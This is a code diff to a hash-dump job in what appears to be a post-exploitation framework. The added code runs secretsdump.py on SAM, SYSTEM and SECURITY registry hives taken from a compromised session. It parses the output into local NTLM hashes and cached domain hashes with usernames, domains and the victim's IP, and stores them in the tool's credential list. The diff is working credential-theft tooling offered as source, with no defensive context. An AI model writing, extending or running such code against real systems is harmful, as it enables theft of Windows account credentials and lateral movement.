@@ -61,6 +61,14 @@ class HashDumpSAMJob(core.job.Job):
 
     def finish_up(self):
 
+        from subprocess import Popen, PIPE, STDOUT
+        p = Popen(["which", "secretsdump.py"], stdout=PIPE)
+        path = p.communicate()[0].strip()
+        path = path.decode() if type(path) is bytes else path
+        if not path:
+            print("Error decoding: secretsdump.py not in PATH!")
+            return
+
         self.sam_file = self.save_file(self.sam_data)
         self.print_status("decoded SAM hive (%s)" % self.sam_file)
 
@@ -70,18 +78,40 @@ class HashDumpSAMJob(core.job.Job):
         self.system_file = self.save_file(self.system_data)
         self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
 
-        from subprocess import Popen, PIPE, STDOUT
-        p = Popen(["which", "secretsdump.py"], stdout=PIPE)
-        path = p.communicate()[0].strip()
-        path = path.decode() if type(path) is bytes else path
-        if not path:
-            print("Error decoding: secretsdump.py not in PATH!")
-            return
         cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
         p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
         output = p.stdout.read()
         self.shell.print_plain(output.decode())
 
+        sam_sec1 = output.split("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)")[1]
+        sam_sec2 = sam_sec1.split("[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)")[0]
+        sam_sec = sam_sec2.splitlines()
+        cached_sec1 = output.split("[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)")[1]
+        cached_sec2 = cached_sec1.split("[*] Dumping LSA Secrets")[0]
+        cached_sec = cached_sec2.splitlines()
+
+        del sam_sec[0]
+        del cached_sec[0]
+
+        for htype in ["sam", "cached"]:
+            hsec = locals().get(htype+"_sec")
+            if hsec[0].split()[0] == "[-]":
+                continue
+            for h in hsec:
+                c = {}
+                c["IP"] = self.session.ip
+                hparts = h.split(":")
+                c["Username"] = hparts[0]
+                c["Password"] = ""
+                if htype == "sam":
+                    c["Hash"] = hparts[-1]
+                    c["HashType"] = "NTLM"
+                    c["Domain"] = ""
+                else:
+                    c["Hash"] = hparts[1]
+                    c["HashType"] = "DCC"
+                    c["Domain"] = hparts[2]
+                self.shell.creds.append(c)
 
         super(HashDumpSAMJob, self).report(None, "", False)
 
